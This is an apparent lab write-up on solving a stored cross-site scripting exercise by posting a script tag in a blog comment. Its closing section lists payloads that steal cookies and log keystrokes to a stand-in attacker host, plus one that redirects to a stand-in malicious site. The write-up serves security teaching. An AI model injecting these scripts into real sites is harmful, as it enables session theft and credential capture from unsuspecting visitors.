# Stored XSS into HTML context with nothing encoded — Apprentice

**Status:** Solved

---

## Goal

Inject JavaScript that gets stored in the database and executes when other users view the page.

---

## Steps (simple & complete)

1. **Find the storage point**
   - Go to any blog post
   - Scroll down to comments section
   - You can post comments that get saved

2. **Test comment functionality**
   - Try posting a normal comment
   - Notice it appears for everyone who views the post

3. **Inject XSS payload**
   - In the comment field, enter:
```
   <script>alert(1)</script>
```
   - Fill other required fields (name, email, etc.)
   - Submit the comment

4. **Execute the attack**
   
   Comment form:
```
   Name: test
   Email: test@test.com
   Website: http://test.com
   Comment: <script>alert(1)</script>
```

5. **Verify stored XSS**
   - Refresh the blog post page
   - Alert popup should appear immediatly!
   - Lab solves automatically

---

## Example

**Posting malicious comment:**
```
Comment: <script>alert(1)</script>
```

**Result:**
- Comment gets saved to database
- Every visitor sees the alert
- Persistent XSS! ✓

---

## Why stored XSS is more dangerous

**Reflected XSS:**
- Requires victim to click malicious link
- Only affects that one victim
- Temporary

**Stored XSS:**
- Stored in database permanently
- Affects ALL users who view the page
- No interaction needed
- Much higher impact!

---

## Real attack scenarios

Steal cookies:
```html
<script>fetch('http://attacker.com?c='+document.cookie)</script>
```

Redirect users:
```html
<script>window.location='http://evil.com'</script>
```

Keylogger:
```html
<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>
```

---

